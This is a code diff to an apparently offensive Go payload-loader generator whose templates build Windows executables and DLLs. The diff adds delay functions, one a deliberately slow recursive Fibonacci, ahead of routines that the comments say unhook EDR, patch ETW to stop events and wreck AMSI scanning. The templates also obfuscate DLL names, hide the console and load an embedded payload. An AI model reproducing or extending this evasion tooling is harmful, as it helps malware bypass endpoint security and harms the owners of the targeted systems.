@@ -56,6 +56,28 @@ func Sandbox_DomainSpecificJoined() string {
 	}`
 }
 
+//Go implementation of counting first n Fibonacci numbers and adding them up
+func SleepFib() string {
+	return `
+	func {{.Variables.DelayFunctionName}}(n int64) int64 {
+		if n < 2 {
+			return n
+		}
+	
+		return {{.Variables.DelayFunctionName}}(n-2) + {{.Variables.DelayFunctionName}}(n-1)
+	}
+	`
+}
+
+//Simple Go Sleep time for x seconds
+func SleepTime() string {
+	return `
+	func {{.Variables.DelayFunctionName}}(n int64) {
+		time.Sleep(time.Duration(n) * time.Millisecond)
+	}
+	`
+}
+
 func JS_Office_Export() string {
 	return `
 	//export xlAutoOpen
@@ -378,6 +400,8 @@ func DLL_Refresher() string {
 
 	
 	{{.Variables.Sandboxfunction}}
+
+	{{.Variables.DelayFunction}}
 	
 	func {{.Variables.Versionfunc}}() string {
 		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
@@ -435,6 +459,7 @@ func DLL_Refresher() string {
 	//export Run
 	func Run() {
 		{{.Variables.Sandbox}}
+		{{.Variables.DelayFunctionName}}({{.Variables.DelayStep}})
 		{{.Variables.ETW}}
 		{{.Variables.AMSI}}
 		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
@@ -516,7 +541,7 @@ func Binary() string {
 	import (
 		"debug/pe"
 		"encoding/base64"
-		"time"
+		{{.Variables.Time_Import}}
 		"[loader]/[loader]"
 		{{.Variables.HEX_Import}}
 		{{.Variables.DebugImport}}
@@ -547,8 +572,7 @@ func Binary() string {
 
 	
 	{{.Variables.Sandboxfunction}}
-
-
+	
 	func {{.Variables.Console}}(show bool) {
 		{{.Variables.getWin}} := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.GetConsoleWindowName}}"))
 		{{.Variables.showWin}} := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc({{.Variables.decode}}("{{.Variables.ShowWindowName}}"))
@@ -564,6 +588,8 @@ func Binary() string {
 		{{.Variables.showWin}}.Call({{.Variables.hwnd}}, {{.Variables.SW_HIDE}})
 		}
 	}
+		
+	{{.Variables.DelayFunction}}
 	
 	func {{.Variables.Versionfunc}}() string {
 		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
@@ -620,9 +646,9 @@ func Binary() string {
 	
 	func main() {
 		{{.Variables.Sandbox}}
+		{{.Variables.DelayFunctionName}}({{.Variables.DelayStep}})
 		{{.Variables.ETW}}
 		{{.Variables.AMSI}}
-		time.Sleep({{.Variables.SleepSecond}} * time.Millisecond)
 		{{.Variables.Version}} := {{.Variables.Versionfunc}}()
 		if {{.Variables.Version}} == "10.0" {
 			{{.Variables.loader}}()
@@ -729,6 +755,7 @@ func DLL() string {
 	import (
 		"encoding/base64"
 		{{.Variables.HEX_Import}}
+		{{.Variables.Time_Import}}
 		"[loader]/[loader]"
 		"strconv"
 		"syscall"
@@ -752,6 +779,8 @@ func DLL() string {
 
 
 	{{.Variables.Sandboxfunction}}
+
+	{{.Variables.DelayFunction}}
 
 	func {{.Variables.Versionfunc}}() {
 		{{.Variables.k}}, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
@@ -793,6 +822,7 @@ func DLL() string {
 	func Run() {
 		{{.Variables.Sandbox}}
 		{{.Variables.Versionfunc}}()
+		{{.Variables.DelayFunctionName}}({{.Variables.DelayStep}})
 		{{.Variables.ETW}}
 		{{.Variables.AMSI}}
 		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
@@ -814,6 +844,7 @@ func DLL() string {
 `
 }
 
+// Unhooks EDR - Loads kernel32 from disk and patches the WriteProcessMemory function to remove hooks
 func WriteProcessMemory_Function() string {
 	return `
 	const (
@@ -881,6 +912,7 @@ func WindowsVersion_Syscall_Unmod() string {
 `
 }
 
+//Patches ETW - Loads ntdll from disk and replaces 4 functions to make sure events are not generated. Could be flagged.
 func ETW_Function() string {
 	return `
 	var {{.Variables.procEtwNotificationRegister}} = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc({{.Variables.decode}}("{{.Variables.EtwNotificationRegisterName}}"))
@@ -902,7 +934,7 @@ func ETW_Function() string {
 `
 }
 
-//TODO - Patch AMSI - loads amsi dll searches for scanbuffer and wrecks it. Could be flagged.
+//Patches AMSI - loads amsi dll searches for scanbuffer and wrecks it. Could be flagged.
 func AMSI_Function() string {
 	return `
 	func {{.Variables.AMSI}}() {
